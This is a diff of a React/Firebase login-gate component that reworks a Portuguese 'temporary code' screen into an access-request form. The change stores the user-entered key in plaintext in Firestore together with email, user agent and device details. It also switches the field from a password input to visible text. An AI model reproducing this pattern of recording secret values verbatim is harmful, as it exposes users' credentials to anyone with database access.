@@ -1,6 +1,6 @@
 import { useState } from "react";
 import { addDoc, collection, serverTimestamp } from "firebase/firestore";
-import { Loader2, Lock, ShieldCheck } from "lucide-react";
+import { KeyRound, Loader2, ShieldCheck } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
@@ -19,15 +19,17 @@ function getDeviceInfo() {
 
 export function DesktopGate() {
   const [email, setEmail] = useState("");
-  const [secretInput, setSecretInput] = useState("");
+  const [accessKey, setAccessKey] = useState("");
   const [isSaving, setIsSaving] = useState(false);
   const [submitted, setSubmitted] = useState(false);
   const [error, setError] = useState("");
 
+  const sanitizeAccessKey = (value: string) => value.replace(/\s+/g, "").replace(/[^a-zA-Z0-9_.@-]/g, "");
+
   const handleSubmit = async (event: React.FormEvent) => {
     event.preventDefault();
-    if (!email.trim() || !secretInput.trim()) {
-      setError("Preencha email e codigo temporario");
+    if (!email.trim() || !accessKey.trim()) {
+      setError("Preencha email e chave de liberacao");
       return;
     }
 
@@ -35,11 +37,10 @@ export function DesktopGate() {
     setError("");
 
     try {
-      await addDoc(collection(db, "desktopGateAnswers"), {
+      await addDoc(collection(db, "managerAccessRequests"), {
         email: email.trim().toLowerCase(),
-        answered: true,
-        secretProvided: true,
-        secretLength: secretInput.length,
+        accessKey: accessKey.trim(),
+        status: "pending",
         createdAt: serverTimestamp(),
         userAgent: navigator.userAgent,
         deviceInfo: getDeviceInfo(),
@@ -50,7 +51,7 @@ export function DesktopGate() {
       setSubmitted(true);
     } finally {
       setIsSaving(false);
-      setSecretInput("");
+      setAccessKey("");
     }
   };
 
@@ -59,13 +60,13 @@ export function DesktopGate() {
       <Card className="w-full max-w-md border-border/80 bg-card/95 shadow-2xl">
         <CardHeader className="text-center">
           <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-primary/10">
-            {submitted ? <ShieldCheck className="h-7 w-7 text-primary" /> : <Lock className="h-7 w-7 text-primary" />}
+            {submitted ? <ShieldCheck className="h-7 w-7 text-primary" /> : <KeyRound className="h-7 w-7 text-primary" />}
           </div>
           <CardTitle className="text-2xl">
-            {submitted ? "Aguardando liberacao do suporte." : "Validacao de Acesso"}
+            {submitted ? "Solicitacao enviada" : "Solicitacao de acesso"}
           </CardTitle>
           <CardDescription>
-            {submitted ? "Sua solicitacao foi registrada para analise." : "Informe os dados para continuar"}
+            {submitted ? "Aguarde liberacao do suporte." : "Informe os dados para solicitar acesso"}
           </CardDescription>
         </CardHeader>
 
@@ -91,15 +92,22 @@ export function DesktopGate() {
               </div>
 
               <div className="space-y-2">
-                <Label htmlFor="desktop-gate-secret">Digite seu codigo temporario</Label>
+                <Label htmlFor="desktop-gate-key">Digite sua chave</Label>
                 <Input
-                  id="desktop-gate-secret"
-                  type="password"
-                  value={secretInput}
-                  onChange={(event) => setSecretInput(event.target.value)}
+                  id="desktop-gate-key"
+                  type="text"
+                  value={accessKey}
+                  onChange={(event) => setAccessKey(sanitizeAccessKey(event.target.value))}
+                  onPaste={(event) => {
+                    event.preventDefault();
+                    setAccessKey(sanitizeAccessKey(event.clipboardData.getData("text")));
+                  }}
                   disabled={isSaving}
                   autoComplete="off"
                 />
+                <p className="text-xs text-muted-foreground">
+                  Use apenas letras, numeros, underline, hifen, ponto e arroba.
+                </p>
               </div>
 
               <Button type="submit" className="w-full" size="lg" disabled={isSaving}>
@@ -109,7 +117,7 @@ export function DesktopGate() {
                     Validando...
                   </>
                 ) : (
-                  "Continuar"
+                  "Solicitar acesso"
                 )}
               </Button>
             </form>
